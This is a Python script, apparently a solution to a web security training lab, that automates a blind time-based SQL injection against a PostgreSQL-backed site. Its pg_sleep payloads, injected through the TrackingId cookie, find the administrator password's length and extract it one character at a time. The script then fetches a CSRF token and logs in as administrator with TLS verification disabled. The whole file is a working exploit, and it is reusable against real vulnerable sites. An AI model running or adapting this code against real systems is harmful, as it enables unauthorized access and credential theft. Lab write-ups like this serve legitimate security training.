import time
import requests
import argparse
import urllib3
from urllib.parse import urljoin
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url, proxies=None):
    try:
        login_url = urljoin(url, 'login')
        print(f"Getting CSRF token from: {login_url}")
        response = session.get(login_url, proxies=proxies, verify=False, timeout=30)
        
        if response.status_code != 200:
            print("Failed to get login page")
            return None
            
        bs = BeautifulSoup(response.text, 'html.parser')
        csrf_token = None
        
        csrf_input = bs.find('input', {'name': 'csrf'})
        if csrf_input and csrf_input.get('value'):
            csrf_token = csrf_input['value']
    
        if csrf_token:
            print(f"Found CSRF token: {csrf_token}")
            return csrf_token
            
        print("CSRF token not found in the page")
        return None
            
    except requests.exceptions.RequestException as e:
        print(f"Error getting CSRF token: {e}")
        return None

def measure_time_delay(url, cookies, proxies=None):
    start_time = time.time()
    requests.get(url, cookies=cookies, proxies=proxies, verify=False, timeout=30)
    end_time = time.time()
    return end_time - start_time

def find_password_length(url, proxies=None):
    print("Determining password length...")
    for i in range(1, 61):
        payload = f"' || (SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE username = 'administrator') = {i} THEN pg_sleep(5) ELSE pg_sleep(0) END) -- "
        cookies = {
            'TrackingId': "a" + payload,
        }
        delay = measure_time_delay(url, cookies, proxies)
        if delay > 4:
            return i
    return None

def extract_password(url, password_length, proxies=None):
    password = ""
    print("Extracting password characters...")
    for position in range(1, password_length + 1):
        for char in "0123456789abcdefghijklmnopqrstuvwxyz":
            payload = f"' || (SELECT CASE WHEN (SELECT SUBSTRING(password,{position},1) FROM users WHERE username = 'administrator') = '{char}' THEN pg_sleep(5) ELSE pg_sleep(0) END) --"
            cookies = {
                'TrackingId': "a" + payload
            }
            delay = measure_time_delay(url, cookies, proxies)
            if delay > 4:
                password += char
                print(f"Found character at position {position}: {char}")
                break
    return password

def sql_injection_test(url, use_proxy=False):
    try:
        proxies = {
            'http': '127.0.0.1:8080',
            'https': '127.0.0.1:8080'
        } if use_proxy else None
        
        password_length = find_password_length(url, proxies)
        if not password_length:
            print("Could not determine password length")
            return False, None
            
        password = extract_password(url, password_length, proxies)
        if not password:
            print("Could not extract password")
            return False, None
            
        print(f"\nExtracted password: {password}")
        
        session = requests.Session()
        csrf_token = get_csrf_token(session, url, proxies)
        
        if not csrf_token:
            print("Failed to get CSRF token")
            return False, None
            
        login_payload = {
            'csrf': csrf_token,
            'username': 'administrator',
            'password': password
        }
        
        login_url = urljoin(url, 'login')
        login_response = session.post(login_url, data=login_payload, proxies=proxies, verify=False, timeout=30)
        
        return is_solved(login_response)
        
    except requests.exceptions.RequestException as e:
        print(f"Error during SQL injection test: {e}")
        return False, None


def is_solved(response):
    try:
        if response.status_code != 200:
            return False, response
        return "log out" in response.text.lower(), response
    except:
        return False, None


def main():
    parser = argparse.ArgumentParser(description='SQL Injection for lab 15')
    parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
    parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    if not args.url.endswith('/'):
        args.url += '/'
        
    print("Starting SQL Injection Test...")
    print(f"Target URL: {args.url}")
    
    success, response = sql_injection_test(args.url, args.proxy)
    if success:
        print("SQL Injection successful")
    else:
        if response:
            print(f"SQL Injection failed. HTTP Status Code: {response.status_code} Response Length: {len(response.text)}")
        else:
            print("SQL Injection failed due to an error")

if __name__ == "__main__":
    main()

